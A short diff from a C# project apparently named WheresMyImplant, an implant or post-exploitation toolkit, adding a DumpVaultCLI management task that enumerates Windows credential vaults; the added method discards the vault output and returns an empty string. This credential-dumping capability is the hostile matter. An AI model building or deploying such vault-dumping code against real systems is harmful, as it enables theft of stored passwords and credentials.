@@ -465,6 +465,15 @@ namespace WheresMyImplant
             return output.ToString();
         }
 
+        [ManagementTask]
+        public static String DumpVaultCLI()
+        {
+            StringBuilder output = new StringBuilder();
+            VaultCLI vault = new VaultCLI();
+            vault.EnumerateVaults();
+            return output.ToString();
+        }
+
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
